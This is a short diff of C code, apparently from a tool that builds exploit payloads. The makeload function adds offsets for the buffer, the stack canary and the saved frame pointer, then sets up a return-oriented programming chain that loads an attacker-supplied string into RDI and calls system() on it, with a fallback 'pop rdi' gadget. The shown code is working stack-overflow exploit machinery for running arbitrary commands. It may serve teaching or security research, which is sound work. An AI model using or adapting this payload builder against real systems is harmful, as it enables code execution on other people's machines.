@@ -27,6 +27,11 @@ ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssi
 	// Offsets are relative to the payload
 	baseAddressesPtr->buf_base = plp;
 
+	// Stack frame from buffer itself, on up the stack...
+	plp->pl_dst.o		= indirectToOffset(&plp->pl_dst, 'B', baseAddressesPtr);
+	plp->pl_canary.o	= indirectToOffset(&plp->pl_canary, 'B', baseAddressesPtr);
+	plp->pl_rbp.o		= indirectToOffset(&plp->pl_rbp, 'B', baseAddressesPtr);
+
         // ROP chain for system(pl_arg)
         plp->pl_popRDI.o        = libc_popRDI?pointerToOffset(libc_popRDI, 'L', baseAddressesPtr):pointerToOffset(&&l_popRDI, 'P', baseAddressesPtr);
         plp->pl_systemArg.o     = pointerToOffset(&plp->pl_arg, 'B', baseAddressesPtr);
@@ -52,8 +57,7 @@ l_popRDI:	// Fallback gadget for "POP RDI"
 
 	// Get the argument to "system()" (if provided)
 	if (p && np > 0) {
-		size_t nc=strlcpy(plp->pl_arg, p, sizeof(plp->pl_arg));
-fprintf(stderr, "%ld\n", nc);
+		size_t nc = strlcpy(plp->pl_arg, p, sizeof(plp->pl_arg));
 		return nc;
 	} // if
 
